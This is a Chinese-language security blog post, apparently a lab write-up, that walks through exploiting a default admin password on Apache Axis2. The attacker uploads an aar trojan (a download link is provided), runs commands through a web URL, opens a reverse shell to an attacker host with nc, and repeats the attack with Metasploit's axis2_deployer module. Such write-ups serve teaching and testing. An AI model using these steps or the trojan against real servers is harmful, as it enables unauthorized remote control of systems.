> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI4MjkxNzY1NQ==&mid=2247486072&idx=1&sn=1d149c024fede423c27c5d8d8fa8371a

#  【漏洞复现】Apache Axis2弱口令（附测试靶机）  
稻草人  玄武盾网络技术实验室   2025-07-01 00:35  
  
“  
对我们感兴趣的话就点个关注吧  
”  
  
## 免责声明：本文仅供安全研究与学习之用，严禁用于非法用途，违者后果自负。  
  
****  
本文详细介绍了Apache Axis2的一个安全漏洞，通过扫描器发现该漏洞允许未经验证的远程命令执行。作者演示了如何使用admin默认密码登录，上传aar木马文件，并通过执行特定命令反弹shell。此外，还展示了使用Meterpreter进行漏洞利用的过程。  
#### 环境介绍  
<table><thead><tr style="box-sizing: border-box;outline: 0px;border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(255, 255, 255);font-synthesis-style: auto;overflow-wrap: break-word;"><th style="box-sizing: border-box;outline: 0px;padding: 8px;margin: 0px;font-weight: 700;border: 1px solid rgb(221, 221, 221);font-synthesis-style: auto;overflow-wrap: break-word;font-size: 14px;color: rgb(79, 79, 79);line-height: 22px;vertical-align: middle;word-break: normal !important;background-color: rgb(239, 243, 245);"><section><span leaf="">主机</span></section></th><th style="box-sizing: border-box;outline: 0px;padding: 8px;margin: 0px;font-weight: 700;border: 1px solid rgb(221, 221, 221);font-synthesis-style: auto;overflow-wrap: break-word;font-size: 14px;color: rgb(79, 79, 79);line-height: 22px;vertical-align: middle;word-break: normal !important;background-color: rgb(239, 243, 245);"><section><span leaf="">IP</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;outline: 0px;"><td style="box-sizing: border-box;outline: 0px;padding: 8px;margin: 0px;font-weight: normal;border: 1px solid rgb(221, 221, 221);font-synthesis-style: auto;overflow-wrap: break-word;font-size: 14px;color: rgb(79, 79, 79);line-height: 22px;vertical-align: middle;word-break: normal !important;"><section><span leaf="">靶机</span></section></td><td style="box-sizing: border-box;outline: 0px;padding: 8px;margin: 0px;font-weight: normal;"><section><span leaf="">192.168.30.134</span></section></td></tr><tr style="box-sizing: border-box;outline: 0px;border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(247, 247, 247);font-synthesis-style: auto;overflow-wrap: break-word;"><td style="box-sizing: border-box;outline: 0px;padding: 8px;margin: 0px;font-weight: normal;border: 1px solid rgb(221, 221, 221);font-synthesis-style: auto;overflow-wrap: break-word;font-size: 14px;color: rgb(79, 79, 79);line-height: 22px;vertical-align: middle;word-break: normal !important;"><section><span leaf="">kali</span></section></td><td style="box-sizing: border-box;outline: 0px;padding: 8px;margin: 0px;font-weight: normal;border: 1px solid rgb(221, 221, 221);font-synthesis-style: auto;overflow-wrap: break-word;font-size: 14px;color: rgb(79, 79, 79);line-height: 22px;vertical-align: middle;word-break: normal !important;"><section><span leaf="">192.168.30.128</span></section></td></tr></tbody></table>### 靶机获取：  

```
链接：https://pan.quark.cn/s/9dc698b2c804?pwd=t8Fv
提取码：t8Fv
```

#### 漏洞扫描：  
  
使用扫描器发现漏洞，发现可以利用  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDm3ZlD9fI389DSGdnF6zPy8wH4wfDPvbEQIkAFKVD2KPJJ7EUSsJCNwA/640?wx_fmt=jpeg "")  
### 开始复现  
  
使用admin和默认密码登陆axis2。  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDmAdUouV92v4xn6NbfoqJwyQ85jf2TdOI8iaOAQa0s4KA2QUmv7JbqFDg/640?wx_fmt=jpeg "")  
  
  
发现漏洞上传点。  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDmfBOFQgM4t1dVJJRLbQvCDbkEQHjIbMvibuecWOeEK6fBNJ1FHlj5q9Q/640?wx_fmt=jpeg "")  
  
  
aar木马下载：  

```
链接：https://pan.quark.cn/s/9dc698b2c804?pwd=t8Fv
提取码：t8Fv
```

  
上传木马文件  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDmecSw2UCd1buIic2icI9n9yo2TiaqQIHOWGbKSwUcE8xQ35B2hvFQQ5IcA/640?wx_fmt=jpeg "")  
  

```
执行命令
http://192.168.30.134/axis2/services/Cat/exec?cmd=ifconfig
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDmib4EulvZ7wMZ7eh6duNBX5BnYJ20KYAvcKU9hTibBuib4EkXEHaOTsnQA/640?wx_fmt=jpeg "")  
#### 反弹shell  
  
使用nc监听端口1111  

```
nc -lvp 1111
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDm69JLiaJxEPFLiblP3sn3ujtXGQN8fno2LpJ0qibKLG7wmcCZwSxGcGh2A/640?wx_fmt=png&from=appmsg "")  
### 使用命令进行反弹shell  

```
http://192.168.30.134/axis2/services/Cat/shell?host=192.168.30.128&port=1111
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDmumjjDCl9veqnCaygXxFNVmQVm4Icj6lS8v6OEOKqSLwliaemCjgdARg/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDmBbOs3Vbibic0SibGklib13MdZ6uO0NFGlhtOqC0lZjhu1iaZn17icATbOA5Q/640?wx_fmt=jpeg "")  
### Meterpreter复现：  

```
msfconsole 
use exploit/multi/http/axis2_deployer
msf6 exploit(multi/http/axis2_deployer) > set rhosts 192.168.30.134
msf6 exploit(multi/http/axis2_deployer) > set rport 80
msf6 exploit(multi/http/axis2_deployer) > exploit
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0kcMxX3tAAS8gLqcX1eaTDmN13sO5VkpbZYW561Bx0nFE1KjOOpmn9B0rpbNp73c4W8eMWok2D51A/640?wx_fmt=jpeg "")  
  
为爱发电，随手点个「推荐」吧！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/UM0M1icqlo0knIjq7rj7rsX0r4Rf2CDQylx0IjMfpPM93icE9AGx28bqwDRau5EkcWpK6WBAG5zGDS41wkfcvJiaA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
* 声明：技术文章均收集于互联网，仅作为本人学习、记录使用。侵权删！！！。  
  
推荐阅读  
  
[Nacos漏洞实战攻防](https://mp.weixin.qq.com/s?__biz=MzI4MjkxNzY1NQ==&mid=2247485832&idx=1&sn=6a0c5ca8f71c5978b6a1f2957346dcec&scene=21#wechat_redirect)  
  
  
[值得关注的十大开源网络安全工具](https://mp.weixin.qq.com/s?__biz=MzI4MjkxNzY1NQ==&mid=2247486028&idx=1&sn=661d541628597072c459e0b76a984602&scene=21#wechat_redirect)  
  
  
[【漏洞复现】Dataease JWT 认证绕过漏洞/远程代码执行（CVE-2025-49001/CVE-2025-49002）](https://mp.weixin.qq.com/s?__biz=MzI4MjkxNzY1NQ==&mid=2247486028&idx=3&sn=d961f6c041977816b00f5c5e7415af1a&scene=21#wechat_redirect)  
  
  
